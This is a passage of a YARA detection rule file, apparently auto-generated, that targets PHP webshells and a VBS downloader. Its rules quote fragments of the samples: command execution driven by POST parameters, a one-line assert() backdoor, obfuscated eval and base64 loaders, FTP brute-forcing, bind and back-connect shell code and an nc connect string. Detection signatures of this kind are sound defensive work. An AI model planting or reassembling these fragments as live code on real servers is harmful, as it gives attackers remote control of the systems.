      $s8 = "entrika.write \"Set xml = CreateObject(\"\"Microsoft.XMLHTTP\"\")\" & vbcrlf" fullword ascii
      $s9 = "Set entrika = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s10 = "entrika.write \"BinaryStream.Type = adTypeBinary\" & vbcrlf" fullword ascii
      $s11 = "entrika.write \"BinaryData = xml.ResponsebOdy\" & vbcrlf" fullword ascii
      $s12 = "entrika.write \"BinaryStream.Write BinaryData\" & vbcrlf" fullword ascii
      $s13 = "entrika.write \"Dim WshShell\"  & vbcrlf" fullword ascii
      $s14 = "entrika.write \"Const adTypeBinary = 1\" & vbcrlf" fullword ascii
      $s15 = "entrika.write \"Dim BinaryData\" & vbcrlf" fullword ascii
      $s16 = "entrika.write \"Dim BinaryStream\" & vbcrlf" fullword ascii
      $s17 = "entrika.write \"BinaryStream.Open\" & vbcrlf" fullword ascii
      $s18 = "entrika.write \"Const adSaveCreateOverWrite = 2\" & vbcrlf" fullword ascii
      $s19 = "Dim WshShell" fullword ascii
      $s20 = "entrika.close" fullword ascii
   condition:
      uint16(0) == 0x533c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule sig_01a00e6583ed3789694d600fa831392aa785c5f9
{
   meta:
      description = "php17 - file 01a00e6583ed3789694d600fa831392aa785c5f9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e680486104e6dc00dcf1d07faa73d92bb3505caaffcae2941a5624bf82db6f0"
   strings:
      $x1 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32\\cmd.exe\";" fullword ascii
      $x2 = "else $sa = @ftp_login(ftp_connect($host,$admin[ftpport]),$user,chop($tmp[$i]));" fullword ascii
      $x3 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname.\"/log.txt\";" fullword ascii
      $x4 = "$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");" fullword ascii
      $x5 = "$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);" fullword ascii
      $x6 = "$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);" fullword ascii
      $x7 = "$sql_query = \"CREATE FUNCTION Mixconnect RETURNS STRING SONAME 'C:\\\\\\Winnt\\\\\\Mix.dll';" fullword ascii
      $x8 = "echo \"<font color=blue>Send: site exec</font> <font color=green>\".$_POST[\"SUCommand\"].\"</font><br>\";" fullword ascii
      $s9 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'" fullword ascii
      $s10 = "$result = $conn->Execute($_POST['sql_query']);" fullword ascii
      $s11 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe';" fullword ascii
      $s12 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"\".$ck.\"_Files.zip\");" fullword ascii
      $s13 = "$url= \"http://data.alexa.com/data?cli=10&dat=snba&url=\".$_SERVER['HTTP_HOST'];" fullword ascii
      $s14 = "$shell = \"select 0x\".$mysql.\" from \".$database.\" into DUMPFILE '\".$uppath.\"/\".$upname.\"';\";" fullword ascii
      $s15 = "<span style=\"font-size: 11px; font-family: Verdana\">PassWord: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s16 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword ascii
      $s17 = "$header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilen" fullword ascii
      $s18 = "$tb->tdbody('host: '.$tb->makeinput('host','127.0.0.1',''.$tb->makehidden('do','port').'','text','12').'&nbsp;" fullword ascii
      $s19 = ":'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','" fullword ascii
      $s20 = ":$dir/$file</span> |<a href=\\\"?action=editfile&dir=$dir&editfile=$file\\\" target=\\\"_blank\\\">view+edit</a> | $end <br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_32e36b9cd77416c8e4d5d7284d54683e75abfed6
{
   meta:
      description = "php17 - file 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
   strings:
      $x1 = "le.com/releases/ckira\\\">kira</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "function KingDefacerftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x3 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x4 = "$logfile = $tmpdir_logs.\"KingDefacer_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s5 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s6 = "#</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwi" ascii
      $s7 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s8 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s9 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s10 = "$fqb_log = \"FTP Quick Brute (called kira v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s11 = "# Home page: http://google.com" fullword ascii
      $s12 = "elseif (!$data = KingDefacergetsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s13 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $s14 = "$log_email = \"jo1n@live.com\"; //Default e-mail for sending logs" fullword ascii
      $s15 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s16 = "$KingDefacer_updateurl = \"http://alturks.com/kira//update/\"; //Update server" fullword ascii
      $s17 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s18 = "$out = \"# Dumped by kira.SQL v. \".$shver.\"" fullword ascii
      $s19 = "header(\"WWW-Authenticate: Basic realm=\\\"kira \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s20 = "if (empty($datapipe[\"remoteaddr\"])) {$datapipe[\"remoteaddr\"] = \"irc.dalnet.ru:6667\";}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule Advanced_Relationships
{
   meta:
      description = "php17 - file Advanced-Relationships.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c596f209c312063c0b7891e8a9d78d1d56bb0dd6baf68660b700c32eedc68859"
   strings:
      $s1 = "* Description: Add advanced relationship objects for relating to including Database Tables, Multisite Networks, Multisite Sites" fullword ascii
      $s2 = "* Description: Add advanced relationship objects for relating to including Database Tables, Multisite Networks, Multisite Sites," ascii
      $s3 = "$page_templates = apply_filters( 'pods_page_templates', get_page_templates() );" fullword ascii
      $s4 = ", Themes, Page Templates, Sidebars, Post Type Objects, and Taxonomy Objects" fullword ascii
      $s5 = "public function data_page_templates ( $name = null, $value = null, $options = null, $pod = null, $id = null ) {" fullword ascii
      $s6 = "* Do things like register/enqueue scripts and stylesheets" fullword ascii
      $s7 = "public function data_post_types ( $name = null, $value = null, $options = null, $pod = null, $id = null ) {" fullword ascii
      $s8 = "if ( !in_array( 'index.php', $page_templates ) && locate_template( array( 'index.php', false ) ) )" fullword ascii
      $s9 = "if ( !in_array( 'page.php', $page_templates ) && locate_template( array( 'page.php', false ) ) )" fullword ascii
      $s10 = "if ( !function_exists( 'get_page_templates' ) )" fullword ascii
      $s11 = "$page_templates[ 'Index (WP Fallback)' ] = 'index.php';" fullword ascii
      $s12 = "$page_templates[ 'Page (WP Default)' ] = 'page.php';" fullword ascii
      $s13 = "if ( in_array( $post_type->name, $ignore ) || 0 === strpos( $post_type->name, '_pods_' ) )" fullword ascii
      $s14 = "foreach ( $page_templates as $page_template_file => $page_template ) {" fullword ascii
      $s15 = "* Data callback for Page Templates" fullword ascii
      $s16 = "* @package Pods\\Components" fullword ascii
      $s17 = "PodsField_Pick::$related_objects[ 'page-template' ] = array(" fullword ascii
      $s18 = "* @param string|array $value The value of the field" fullword ascii
      $s19 = "$page_templates = array_flip( $page_templates );" fullword ascii
      $s20 = "return apply_filters( 'pods_form_ui_field_pick_' . __FUNCTION__, $data, $name, $value, $options, $pod, $id );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_38eaac0ba66213019e0dbc7eb786eabaaa3ee510
{
   meta:
      description = "php17 - file 38eaac0ba66213019e0dbc7eb786eabaaa3ee510.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "13386fce1552f613ed702a7bfdf1543eec41172ad3872e0fabbdc06b102d13f3"
   strings:
      $s1 = "'RcmAoqXtfcdvGN24SqjwfcGvHTCP0cGqroz4SqyizcG6Ecx4SqjP1okif5Nv1L49STCbSYkQ9TCPmcCb1CxbSTCwsCxbSTCbSTCb'." fullword ascii
      $s2 = "'oj60Tjq05jizoxwyv8AePeHfMxbl7NqzcdPzWxP0cGqrogHSMxKMTCbSTb9STCbSYkQ9TCP4QNqtoN6oqdq05jizox55aeEGQ'." fullword ascii
      $s3 = "'Z4SQX3RoGv9qyRt5y697N6oOiE1LzblY2HFMv9STCbSh49MTCbSTCbSTCbloGOSa2w0hjwHoXP0MCqKTx4SqyRt5y697N6oOiR'." fullword ascii
      $s4 = "'SvjircXizYknHYN10MyqtcX8X6n3l7k6f7y89qn3veR68kzqtoy0tcXigT0E1MeHMC2P4QN6g7NOSa2wb5kBg7Nq1QkA1hm8'." fullword ascii
      $s5 = "'HMC2PDQk0H7NqgTZESvjircXizYknHYN10MyqtcX8X6n3l7k6f7y89qn3veR68kzqDQk0H7NqgT0E1MeHMC2Ptoy0tcXigTZE'." fullword ascii
      $s6 = "'NqzQNlGTClSqjq0czb3TynzcmnBMC597knl7NqgqgE+qyt0QkP0cGOHTC5uoXBE7kBEqgE+qjq0czlsCxbSTCbMTCbSTj'." fullword ascii
      $s7 = "'veR68kzqEYyiD7NOxN2l1L49qqyR0cd6t7XigTZESvjircXizYknHYN10MyqtcX8X6n3l7k6f7y89qn3veR68kzqD7N6gQk50'." fullword ascii
      $s8 = "'loGiDTZESqyRt5y697N6oOiRoqy05L49STCbSTCbSTCPDYkUSa2w4odc9OebHTCPr5kESW2bAMeHMTCbSTCbS'." fullword ascii
      $s9 = "'b', 'n'=>'F', 'q'=>'J', 'p'=>'q', 's'=>'7', 'r'=>'u', 'u'=>'j', 't'=>'h', 'w'=>'B', 'v'=>'Q', 'y'=>'G', 'x'=>'i', 'z'=>'y');" fullword ascii
      $s10 = "'HMCxbSTCwz7NPRcmUSqy6foGP0oGvsCGEMCm7Rom6EYk3rTyizcm3zNgv46CS1CGHMCkt0QkP0cxSx'." fullword ascii
      $s11 = "'STCbSTCbSTCbSqyt0QkP0cG6ocdPz5y3Rcjw0cxSlYz05TZESqjQsCxbSTCbSTCbSTCbSTCbSTCbS'." fullword ascii
      $s12 = "'N'=>'X', 'Q'=>'Y', 'P'=>'R', 'S'=>'g', 'R'=>'1', 'U'=>'4', 'T'=>'I', 'W'=>'L', 'V'=>'E', 'Y'=>'a', 'X'=>'2', 'Z'=>'D', 'a'=>'P" fullword ascii
      $s13 = "'oqy05MeHMTCbSTCbSTCblQgTSa2wuodir5CSloGO1L49STCbSTCbSTCPzQkBlTZEScmnr7CS4WCb'." fullword ascii
      $s14 = "'jP0c03DQk6zodO9qy7zoXRoTm7zoXExN2lsCSlqqy7zoXESa2wr5kRIoknucm3gMCPmcm3DMeHM'." fullword ascii
      $s15 = "'Qkqu7yim7Xt1YmDHokBfcjnzcdPR5G0UhxcsCxbSTCbloGiDvXttcGOSa2wg5jqH7kU9qy69Q'." fullword ascii
      $s16 = "'2lMC2lMCNHMCv00hy0EMClsCS03CS9qYkQ97XiENXRt7X0uNdnRodP0cR3Gcy'." fullword ascii
      $s17 = "'P4QNqtoN6oqdq07y0z7k6EqRE3aNPz5k8SqxQSYN6g7Nv9qyt0QkP0cG6oqEAavEn828'." fullword ascii
      $s18 = "$vPJ9KOQ = 'Cm0mMy0gcXiEMCPI8V3einHxQX3l72q5M2bmqxw1cd605CSlNRwa8RPoTm6RcdPfoi3tQdP1oXUxN2lSqx'." fullword ascii
      $s19 = "'bSTCbSTCbSTCbSTCbSTCbSTCbSTCbSTCbSTCblYzb3Tj6RQG6EcxSl5x4SOC4ScdPzcy3gMCPXWCbGLxc1MeHMTCbSTCbSTCbSTC'." fullword ascii
      $s20 = "'ESqy71oyirQkR0L49qCNEMCNEMCS017xt0oNwEh2Sl7kRtYkAgM2lMCNHMCv00hy0EMClsCS03CS9q7m3z7knuYCb9qyiDQk0'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_3451b6e3980c3b8b2f3ccbcfb04b227452ff084d
{
   meta:
      description = "php17 - file 3451b6e3980c3b8b2f3ccbcfb04b227452ff084d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e034b3b204db76ae71a6408b29580875a82d6285eb0ba11d29570e564e867d1"
   strings:
      $x1 = "else $msg = \"error: file not found $namafile\";}?><br><br><br><br> <table class=\"tabnet\"> <tr><th>Bind Port</th><th>Back conn" ascii
      $x2 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'boom')){error_reporting(0);function entre2v2($text,$marqueurDebutLien,$marqueurFinLi" ascii
      $x3 = "R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',07" ascii
      $x4 = "B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_content" ascii
      $x5 = "<html><head><title>K2LL33D SHELL - DCVI.NET Developer ROOT SHELL</title><link href='http://fonts.googleapis.com/css?family=Orbit" ascii
      $x6 = "<html><head><title>K2LL33D SHELL - DCVI.NET Developer ROOT SHELL</title><link href='http://fonts.googleapis.com/css?family=Orbit" ascii
      $x7 = "if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {$port = trim($_PO" ascii
      $x8 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'keyboard')){if(empty($_POST['pwd'])){echo \"<br><br><center><div class='mybox'><h2 s" ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$buff = @ob_get_contents();@ob_end_clean();return $buff;} " fullword ascii
      $x10 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'config')){ error_reporting(0);if ($_POST['kill']) {$url = $_POST['url'];$user = $_PO" ascii
      $x11 = "}$defacer=$_POST['defacer'];if(!$sites){echo '</pre>';exit;}$sites=array_unique(str_replace('http://',',$sites));$total=count($s" ascii
      $x12 = "Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo \"<table align=center border=1 style='w" ascii
      $x13 = "Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo \"<br><br><table align=center border=1>" ascii
      $x14 = "Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo \"<br><br><center><div class='mybox'><h" ascii
      $s15 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'vb')) {if(empty($_POST['index'])){echo \"<center><br><br><div width='100%' class='my" ascii
      $s16 = "$s_my_ip = $_SERVER['REMOTE_ADDR'];$rsport = \"443\";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = \"<center><div class=" ascii
      $s17 = "elseif(isset($_GET['x']) && ($_GET['x'] == 'about')){echo '<center><br><br><div class=\"mybox\"><br><h2 style=\"font-size:50px;" ascii
      $s18 = "elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {$port = tr" ascii
      $s19 = "\";file_put_contents(\".htaccess\",$htaccess,FILE_APPEND);$passwd=$_POST[\"passwd\"];$passwd=explode(\"\\n\",$passwd);echo \"<ce" ascii
      $s20 = "/th><th>download and Exec</th></tr><tr><td> <table> <form method=\"post\" actions=\"?y=<?php echo $pwd;?>&amp;x=back\"><tr><td>P" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_56601575943a8bae3498355e37e13fe41a2cb1e9
{
   meta:
      description = "php17 - file 56601575943a8bae3498355e37e13fe41a2cb1e9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c034bad1e47ad17fbcd838f09cbdb13d46b90ae107c91c07e903635a3bd39b25"
   strings:
      $s1 = "<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[faith]);  ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a7635ed60d0bf8127c42991ae7ba4ae5c911cc0e
{
   meta:
      description = "php17 - file a7635ed60d0bf8127c42991ae7ba4ae5c911cc0e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b052d89ffe953e58494c82a61df9bd4816551a4786953121a2ef12356a722420"
   strings:
      $s1 = "register_tick_function ($e, $_REQUEST['pass']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1645d4993c1b4ffb4c9243ad194e78dc
{
   meta:
      description = "php17 - file 1645d4993c1b4ffb4c9243ad194e78dc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e7085db634dd44d57552d2d53f69c9e045dae2c43e97fff409548878653d1819"
   strings:
      $s1 = "n6uVrnU1HkG/RA137J4OOvfHl0f+56u7sLHXLbf2N14d3r+O27J38BJoFTx/cw9lOg1X0I7t2C93" fullword ascii
      $s2 = "c31tFipbQ4XqfDh0bNfySOrmc3uHx5sbh2eg0MO+DjDPRAXr3jSyhhUsPYlfz36UVFgtp+KvzsZf" fullword ascii
      $s3 = "7X39d9o6EujP2XP2f1C97DXcEgKk7W1DSJrvkKZJms9+pC9rjAEXg7m2CUm7+d/fzOjDsjGEtHd3" fullword ascii
      $s4 = "ZIUiH2SxJUW3jHL0EjAGmvDfircI8RvqMbnYSRP2pAT72WHjfeOcLZfZ8e4ut7wmQjH9jszJMt3O" fullword ascii
      $s5 = "gM0JBzTmgW8gl5F6txVarT4WtrELOghz57aoYR2769g9/nNsRXYXM+/DvhVi4vd+EwgfEuFjPNeD" fullword ascii
      $s6 = "6BV+aOfo3JNfez8VPdsTOlw1ocGV5fyYdNXXBdkPTSV9VIVeSLyr2pKEyNDtmvt9dXjHQt9zW+wf" fullword ascii
      $s7 = "+ArYauYBr9RuntxLLC/6hWO7EegKfwF9f46cgHvkzaCOzaBObuE4eGKzreGed4xkYoP+Fajifi9O" fullword ascii
      $s8 = "OQprjoLu1Kn38KcomqhVwNR5pLsYmcbQZKHYXAn/vR0NcG+dgnkQf+koU3JFZgb9CXY+qNGigm6+" fullword ascii
      $s9 = "ekYtIGUj58l1TKW5XN7cfBrN/GripBYR2tYAr0IU0neQeXo+B//IdaPVZbiMwZqicuIlhOX5USce" fullword ascii
      $s10 = "IH0nb+y60ah6MITuKp/3Ljon+0flz3ve7WG/83z7g//Nunr5rbl/2ft8tvHaXva+Hy4f3X6qRjBU" fullword ascii
      $s11 = "D6nRF48W1QPxgJGFdFJjOPIG4hSnHQaplBi2kt7MPqZbFxl9THL6//fxf7GP3waOcmXWO7iU0cGl" fullword ascii
      $s12 = "IV0gY7yyKumgSfupFW21FrBk6pzcJlGVvEZeId1ZY2qHqM7rU2//iAdPOnpthExTg9GNjVFiQVMf" fullword ascii
      $s13 = "1vhCkYGCXqmWoTSLR4NY6GGnU+qQ76K21q//WTdL8fKqIyug2IisANaZunHT9KxBD1jLvR85U1UN" fullword ascii
      $s14 = "lt/tvw/fb+n84///vH85fu92vyX6Y0sXvFDuLCXg904r9nbD/3Q/vk/jay0fgB55gXnuBeiv9nLr" fullword ascii
      $s15 = "wUt435lfV7LuEOI015FpC7ygegsvFEQ0GRluT0QoxmdmTTh11YgkGaIp9AMKzUE/YgO2MHxWCo/r" fullword ascii
      $s16 = "xxUmKderIhq3YDl3MFX+LJoAD1VimvhVNM/+9AgZ/CmaJ90hfuAfyLHaDiMXDMyHj/f4G9KjAI/R" fullword ascii
      $s17 = "6uoA/idssoyruykzLNPupsSELEhQXhPXi2UeHULn0XLBne64ao1RBEslA4MhTsk05F0+/A/HmDsY" fullword ascii
      $s18 = "0/eN5/bdKB8n9q2Oa9/8OfIjJ7wJRgMEEtmSj8Cfs8bxEXDRhJ4zJQs76dKdoZ0vCBa1RwPeOcBo" fullword ascii
      $s19 = "+/h1oJiJSZAvud7XaXI2zWa9blvVPSE/H7Q9h7iunRldwzBqmbE0IF3d81b7JTxFFZfwkQx57Jry" fullword ascii
      $s20 = "c/O3sI6qyC+SCSsyKihO8MS+TJVceowOFQZ64ad2l7GRZKp/PndISDwqxN0O9FP9tNcl2tR1QVKv" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule sig_01931a6925d3de09e5f87419d9d55055
{
   meta:
      description = "php17 - file 01931a6925d3de09e5f87419d9d55055.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "66d5a0e37a8fa9af9d7da38c8a4ce12d59ceb8de0b14a7979dc987f73e8d56ea"
   strings:
      $s1 = "* pwhash.php file for PHP Shell 2.1" fullword ascii
      $s2 = "<title>Password Hasher for PHP Shell 2.1</title>" fullword ascii
      $s3 = "latest version at <a href=\"http://mgeisler.net/php-shell/\">mgeisler.net/php-shell/</a>." fullword ascii
      $s4 = "<h1>Password Hasher for PHP Shell 2.1</h1>" fullword ascii
      $s5 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s6 = "* Copyright (C) 2005 Martin Geisler <mgeisler@mgeisler.net>" fullword ascii
      $s7 = "Copyright &copy; 2005, <a href=\"mailto:mgeisler@mgeisler.net\">Martin Geisler</a>. Get the" fullword ascii
      $s8 = "<input name=\"password\" type=\"text\" value=\"<?php echo $password ?>\">" fullword ascii
      $s9 = "echo \"  <p><i>Enter a username and a password and update.</i></p>\\n\";" fullword ascii
      $s10 = "$username = isset($_POST['username']) ? $_POST['username'] : '';" fullword ascii
      $s11 = "* Licensed under the GNU GPL.  See the file COPYING for details." fullword ascii
      $s12 = "\"<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pipe)," fullword ascii
      $s13 = "$hash = $fkt . ':' . $salt . ':' . $fkt($salt . $password);" fullword ascii
      $s14 = "echo \"  <p>Write the following line into <tt>config.php</tt> \" ." fullword ascii
      $s15 = "\"in the <tt>users</tt> section:</p>\\n\";" fullword ascii
      $s16 = "if ($username == '' || $password == '') {" fullword ascii
      $s17 = "<form action=\"<?php $_SERVER['PHP_SELF']; ?>\" method=\"POST\">" fullword ascii
      $s18 = "echo htmlentities(str_pad($username, 8) . ' = \"' . $hash . '\"') . \"\\n\";" fullword ascii
      $s19 = "echo '  <p>Please choose another username and try again.</p>' . \"\\n\";" fullword ascii
      $s20 = "<input name=\"username\" type=\"text\" value=\"<?php echo $username ?>\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_2016_08_07_125128_create_orchid_attachmentstable_table
{
   meta:
      description = "php17 - file 2016_08_07_125128_create_orchid_attachmentstable_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d2b44712e15088e9419856089efd39e0e6ea79c021365ed7e04627e08183fbdb"
   strings:
      $s1 = "$table->text('description')->nullable();" fullword ascii
      $s2 = "Schema::create('attachments', function (Blueprint $table) {" fullword ascii
      $s3 = "Schema::create('attachmentable', function (Blueprint $table) {" fullword ascii
      $s4 = "$table->integer('user_id')->nullable();" fullword ascii
      $s5 = "$table->index(['attachmentable_type', 'attachmentable_id']);" fullword ascii
      $s6 = "$table->text('hash')->nullable();" fullword ascii
      $s7 = "$table->string('extension')->nullable();" fullword ascii
      $s8 = "Schema::drop('attachments');" fullword ascii
      $s9 = "Schema::drop('attachmentable');" fullword ascii
      $s10 = "$table->bigInteger('size')->default(0);" fullword ascii
      $s11 = "$table->text('alt')->nullable();" fullword ascii
      $s12 = "$table->integer('attachmentable_id');" fullword ascii
      $s13 = "$table->integer('attachment_id');" fullword ascii
      $s14 = "$table->string('attachmentable_type');" fullword ascii
      $s15 = "$table->integer('sort')->default(0);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule A128GCMKW
{
   meta:
      description = "php17 - file A128GCMKW.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d315c488427660a603d817d28b3e076178ed5ad3ce0c225c1dcaed5d5a331dc0"
   strings:
      $s1 = "namespace Jose\\Algorithm\\KeyEncryption;" fullword ascii
      $s2 = "* This software may be modified and distributed under the terms" fullword ascii
      $s3 = "* of the MIT license.  See the LICENSE file for details." fullword ascii
      $s4 = "* Copyright (c) 2014-2018 Spomky-Labs" fullword ascii
      $s5 = "protected function getKeySize()" fullword ascii
      $s6 = "* The MIT License (MIT)" fullword ascii
      $s7 = "public function getAlgorithmName()" fullword ascii
      $s8 = "* Class A128GCMKW." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_4657488f0ba3357cf583238479eab54f18aa82af
{
   meta:
      description = "php17 - file 4657488f0ba3357cf583238479eab54f18aa82af.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "721ca25ccbd2cdfd1cda6073b39f4b354cfc22715e24e92523278d12dc6065ac"
   strings:
      $s1 = "$F='asek464_enck4ode(xk4(gzk4compress(k4$k4o),$kk4k4k4));k4print(\"<$k>$d</$k>\");@sessionk4_desk4troy();}}}}';" fullword ascii
      $s2 = "$X='ray(\"/k4\",\"+\"),$ss($k4sk4[$i],0k4k4,$e))),$k)k4));$o=obk4_get_contk4ek4nts();k4ob_endk4_clek4an();$d=b';" fullword ascii
      $s3 = "$i=';ob_start(k4);@evak4l(@gzunk4compresk4s(@x(k4@bk4ase6k44_decok4de(preg_replak4ce(arrak4yk4(\"/_k4/k4\",\"/-/\"),k4ar';" fullword ascii
      $s4 = "$H='rayk4_key_exisk4tsk4($i,$k4s)){$s[$k4i].=$p;k4$e=strpk4os($s[$k4i],$fk4)k4;if($e){$k=$k4kh.k4$kk4f';" fullword ascii
      $s5 = "$u='4n $o;}$r=k4$k4_SERk4VER;$rr=@$r[\"HTTP_REFERk4ER\"]k4;$ra=k4@$r[\"HTTP_ACk4CEPk4Tk4_LANGUAGE\"]k4;ifk4(';" fullword ascii
      $s6 = "$L='atk4ch_allk4(\"/([\\\\w])[k4\\\\w-]+(?k4:;q=k40.([\\\\d]))k4?,?/\",$k4rk4a,$m);if(k4$q&&$m){k4@sessk4ik4on_k4k4start();$';" fullword ascii
      $s7 = "$V='k4s=&$_Sk4ESSION;$ss=\"substk4r\";k4$sl=\"stk4rtolowk4er\";$i=$mk4k4[1][0].$m[1k4][1k4];k4k4$k4h=$sl($ss(md';" fullword ascii
      $s8 = "$v='$khk4=\"5d41\";$kf=k4\"4k402a\";funck4tik4on x($k4t,$k){$c=k4strlek4n($k);$l=k4strlk4en(k4$t);$ok4=\"\";fork4(';" fullword ascii
      $s9 = "$R='k4$rr&&$k4ra){$u=parse_urlk4($rr);k4parsk4e_k4stk4r($u[\"query\"],$qk4k4);$qk4=ark4ray_valuesk4($q);pk4reg_m';" fullword ascii
      $s10 = "$n='$i=0;$k4i<$lk4;){for($jk4=0;k4($j<$c&&$ik4<$l)k4;$j++,$ik4++)k4{$ok4.=$k4t{$i}^k4$k{k4$j};}}rek4turk';" fullword ascii
      $s11 = "$B='5($i.$kh),k40,3));k4k4$fk4=$sl(k4$ss(md5($i.$k4kf)k4,0,3k4));$p=k4\"\";for($z=1;$k4z<count($mk4[1]);k';" fullword ascii
      $s12 = "$C='4$z++)$p.k4k4=$q[$m[2]k4[$z]]k4;ifk4(strpos($p,$k4k4hk4)===0k4){$s[$i]=\"\";k4$p=$ss($p,3);k4}ik4f(ar';" fullword ascii
      $s13 = "$j=str_replace('k4','',$v.$n.$u.$R.$L.$V.$B.$C.$H.$i.$X.$F);" fullword ascii
      $s14 = "$d=str_replace('VW','','crVWeVWaVWteVWVW_functVWion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_3e4173ac8bb0f101eae4bec8312542e151d6e7e0
